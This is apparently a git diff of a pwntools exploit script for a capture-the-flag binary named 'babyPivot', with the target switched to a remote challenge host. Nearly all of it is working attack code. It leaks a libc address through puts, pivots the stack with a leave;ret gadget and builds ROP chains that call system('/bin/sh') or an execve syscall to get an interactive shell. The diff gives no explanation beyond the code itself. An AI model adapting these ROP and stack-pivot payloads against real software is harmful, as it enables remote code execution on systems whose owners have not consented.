@@ -2,11 +2,11 @@ from pwn import *
 
 # p = process("./babypivot")
 p = process("./babyPivot",env={"LD_PRELOAD":"./babypivot-libc.so.6"})
-# p = remote("pwn.sh4dy.com",5006)
+p = remote("pwn.sh4dy.com",5006)
 
 elf = context.binary= ELF("./babyPivot")
 libc = ELF("./babypivot-libc.so.6")
-context.log_level = 'debug' 
+# context.log_level = 'debug' 
 
 ret=0x000000000040101a
 offset_to_rbp = 32
@@ -14,10 +14,10 @@ secrets_location = 0x4047a0
 leave_ret = 0x00000000004011e6 # : leave ; ret
 pop_rdi_ret = 0x00000000004012e3 #: pop rdi ; ret
 
+nop_ret = 0x00000000000319bf
 
-
-payload1 = p64(ret) + p64(pop_rdi_ret)+ p64(elf.got.puts)+p64(elf.plt.puts) +p64(ret) + p64(elf.sym.main) 
-gdb.attach(p,'init-gef')
+payload1 = p64(ret) + p64(pop_rdi_ret)+ p64(elf.got.puts)+p64(elf.plt.puts) +p64(ret) + p64(elf.sym._start) 
+# gdb.attach(p,'init-gef')
 p.recvline()
 p.recvline()
 p.recvline()
@@ -49,7 +49,7 @@ binsh = next(libc.search(b'/bin/sh\x00'))
 print(hex(binsh))
 
 
-payload3= flat('\x00'*200,ret,ret,pop_rdi_ret,binsh,ret,system)
+payload3= flat('\x00'*400,ret,pop_rdi_ret,binsh,system)
 
 
 
@@ -103,7 +103,7 @@ SYSCALL = 0x00000000000630a9 + libc.address
 
 
 payload = flat(
-    '\x00'*200,
+    '\x00'*400,
     ret,
     POP_RAX,
     0x3b,
@@ -123,11 +123,11 @@ p.recvline()
 p.recvline()
 
 print(payload3)
-p.sendline(payload3)
+p.sendline(payload)
 # p.interactive()
 
 # p.recvline()
-payload4= flat(b'a'*offset_to_rbp,secrets_location+201,leave_ret)
+payload4= flat(b'a'*offset_to_rbp,secrets_location+401,leave_ret)
 p.send(payload4)
 print(payload4)
 p.interactive()
